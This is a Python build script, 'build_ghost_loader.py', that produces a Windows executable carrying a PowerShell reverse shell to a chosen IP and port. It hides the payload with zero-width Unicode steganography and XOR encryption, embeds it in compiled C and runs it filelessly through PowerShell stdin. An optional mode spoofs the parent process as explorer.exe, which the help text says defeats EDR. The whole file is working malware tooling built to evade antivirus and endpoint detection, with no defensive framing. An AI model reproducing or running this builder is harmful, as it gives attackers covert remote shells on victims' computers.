#!/usr/bin/env python3
"""
build_ghost_loader.py — Ghost Loader EXE Builder
22DIV / george wu

Builds an exe that:
  1. Contains a ghost-encoded PS1 (zero-width Unicode steg) embedded as raw bytes
  2. At runtime: pipes it to powershell stdin — nothing written to disk
  3. Strings-dump shows invisible Unicode — no socket/shell strings visible

Usage:
    python build_ghost_loader.py <ip> <port>
    python build_ghost_loader.py 192.168.1.92 4443

Output: shell/ghost_loader.exe
"""

import os
import sys
import subprocess
import tempfile

ROOT        = os.path.dirname(os.path.abspath(__file__))
SHELL_DIR   = os.path.join(ROOT, "shell")
GHOST_DIR   = os.path.join(ROOT, "ghost-encoder")
GHOST_SCRIPT = os.path.join(GHOST_DIR, "ghost_encode.py")
TEMPLATE_V2 = os.path.join(SHELL_DIR, "ghost_loader_template.c")
TEMPLATE_V3 = os.path.join(SHELL_DIR, "ghost_loader_v3_template.c")
OUTPUT_C    = os.path.join(SHELL_DIR, "ghost_loader_gen.c")
OUTPUT_EXE  = os.path.join(SHELL_DIR, "ghost_loader.exe")

try:
    from cheyanne_config import VCVARS
except ImportError:
    VCVARS = r"C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"

GREEN  = "\033[92m"
RED    = "\033[91m"
AMBER  = "\033[93m"
CYAN   = "\033[96m"
DIM    = "\033[2m"
RST    = "\033[0m"
BOLD   = "\033[1m"


def log(msg, colour=CYAN):
    print(f"  {colour}[*]{RST} {msg}")


def ok(msg):
    print(f"  {GREEN}[+]{RST} {msg}")


def err(msg):
    print(f"  {RED}[!]{RST} {msg}")


def build(ip, port, v3=False):
    ver = "v3 [PARENT SPOOF]" if v3 else "v2 [DIRECT]"
    print(f"\n  {CYAN}{BOLD}=== GHOST LOADER BUILD {ver} --- {ip}:{port} ==={RST}\n")
    TEMPLATE = TEMPLATE_V3 if v3 else TEMPLATE_V2

    # ── Step 1: verify ghost-encoder present ──────────────────────────────
    if not os.path.exists(GHOST_SCRIPT):
        err(f"ghost_encode.py not found at: {GHOST_DIR}")
        err("Clone it:  gh repo clone rainfantry/ghost-encoder")
        return False

    # ── Step 2: generate ghost PS1 ────────────────────────────────────────
    ps1_tmp = os.path.join(ROOT, "_ghost_loader_tmp.ps1")
    log(f"Generating ghost PS1 payload for {ip}:{port}...")
    env = os.environ.copy()
    env["PYTHONIOENCODING"] = "utf-8"
    r = subprocess.run(
        [sys.executable, GHOST_SCRIPT, "--shell", ip, port, "-o", ps1_tmp],
        cwd=GHOST_DIR, env=env, capture_output=True, text=True
    )
    if not os.path.exists(ps1_tmp):
        err("ghost_encode.py failed — PS1 not generated")
        if r.stderr:
            print(r.stderr)
        return False

    # ── Step 3: read PS1 as raw UTF-8 bytes ───────────────────────────────
    with open(ps1_tmp, "rb") as f:
        payload_bytes = f.read()
    os.remove(ps1_tmp)
    ok(f"Payload captured: {len(payload_bytes)} bytes")

    # ── Step 4: XOR-encrypt with random key (new key every build) ─────────
    import random
    xor_key = random.randint(1, 255)
    enc_bytes = bytes(b ^ xor_key for b in payload_bytes)
    ok(f"XOR key: 0x{xor_key:02x} — payload encrypted, no PS1 strings in binary")

    # ── Step 5: format encrypted bytes as C byte array ────────────────────
    hex_parts = []
    for i, b in enumerate(enc_bytes):
        if i % 16 == 0:
            hex_parts.append("\n    ")
        hex_parts.append(f"0x{b:02x}, ")
    hex_array = "".join(hex_parts).strip().rstrip(",")

    # ── Step 6: inject into template ──────────────────────────────────────
    with open(TEMPLATE, "r", encoding="utf-8") as f:
        template = f.read()

    c_source = template.replace(
        "/* XOR_KEY_VALUE */", f"0x{xor_key:02x}"
    ).replace(
        "    /* PAYLOAD_BYTES */\n    0x00",
        f"    /* {len(enc_bytes)} bytes XOR-encrypted, key=0x{xor_key:02x} */\n    {hex_array}"
    )

    with open(OUTPUT_C, "w", encoding="utf-8") as f:
        f.write(c_source)
    log("C source generated with embedded payload")

    # ── Step 6: compile via vcvars + cl.exe ───────────────────────────────
    log("Compiling ghost_loader.exe...")
    if not os.path.exists(VCVARS):
        err(f"vcvars64.bat not found: {VCVARS}")
        return False

    gen_name = os.path.basename(OUTPUT_C)
    cmd = (f'"{VCVARS}" && cd /d "{SHELL_DIR}" && '
           f'cl.exe "{gen_name}" /Fe:"{OUTPUT_EXE}" /O1 /GS- /utf-8 '
           f'/link /SUBSYSTEM:WINDOWS crypt32.lib')
    result = subprocess.run(
        cmd, shell=True, cwd=SHELL_DIR,
        capture_output=True, text=True,
        encoding="utf-8", errors="replace"
    )

    # clean up intermediate files
    for ext in [".obj", "_gen.c"]:
        f = os.path.join(SHELL_DIR, f"ghost_loader{ext}")
        if os.path.exists(f):
            os.remove(f)
    if os.path.exists(OUTPUT_C):
        os.remove(OUTPUT_C)

    if result.returncode == 0 and os.path.exists(OUTPUT_EXE):
        size_kb = os.path.getsize(OUTPUT_EXE) // 1024
        ok(f"Build successful: ghost_loader.exe ({size_kb} KB)")
        print(f"\n  {DIM}  Payload: {len(payload_bytes)}B ghost steg PS1 embedded as byte array{RST}")
        print(f"  {DIM}  Runtime: pipes to powershell stdin — 0 bytes written to disk{RST}")
        print(f"  {DIM}  Strings: invisible zero-width Unicode — no socket/shell signatures{RST}")
        print(f"  {DIM}  Target:  {ip}:{port}{RST}\n")
        return True
    else:
        err("Compile failed:")
        print(result.stdout[-2000:] if result.stdout else "")
        print(result.stderr[-1000:] if result.stderr else "")
        return False


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("ip")
    ap.add_argument("port")
    ap.add_argument("--v3", action="store_true",
                    help="v3: parent-process spoof (explorer.exe) — defeats EDR parent-child chain")
    args = ap.parse_args()
    ok_flag = build(args.ip, args.port, v3=args.v3)
    sys.exit(0 if ok_flag else 1)
